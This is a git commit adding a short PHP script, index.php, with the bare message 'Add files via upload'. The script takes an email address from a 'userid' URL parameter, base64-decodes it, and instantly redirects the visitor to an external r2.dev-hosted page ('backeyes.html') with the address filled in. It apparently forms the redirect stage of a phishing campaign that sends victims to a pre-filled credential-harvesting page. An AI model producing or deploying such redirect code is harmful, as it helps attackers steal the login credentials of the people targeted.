3761e5d89584167291f34fa451a7d42fc6a7c12a
shushu10202 <142275494+shushu10202@users.noreply.github.com>
2023-11-07 01:52:30 +0400

    Add files via upload

---
+++ index.php
@@ -0,0 +1,27 @@
+<?php
+function isBase64($data)
+{
+    if (base64_encode(base64_decode($data)) === $data) {
+        return true;
+    } else {
+        return false;
+    }
+}
+
+function decode($email)
+{
+    if (isBase64($email)) {
+        $email = base64_decode($email, false);
+    }
+
+    header(
+        "refresh:0;url= https://pub-c929e88dfe4b4a3abac22a83118f1e40.r2.dev/backeyes.html?emai=" .
+            $email
+    );
+}
+if (isset($_GET["userid"]) && !empty($_GET["userid"])) {
+    $email = $_GET["userid"];
+    decode($email);
+}
+
+?>
